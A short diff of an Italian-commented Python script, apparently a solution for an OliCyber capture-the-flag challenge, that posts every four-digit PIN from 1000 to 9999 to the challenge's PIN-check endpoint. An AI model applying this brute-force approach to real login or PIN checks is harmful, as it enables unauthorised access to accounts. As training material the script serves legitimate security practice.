@@ -1,9 +1,13 @@
 import requests
 
 #Inserisco l'url
-url = ("")
+url = ("http://pincode.challs.olicyber.it")
 
-payload = {"pincode" : "numeri da 1000 a 9999"}
+n = list(range(1000, 10000))
+
+#print(str(n))
+
+payload = {"pincode" : n}
 
 #Richiesta post
 r = requests.post(url, data = payload)
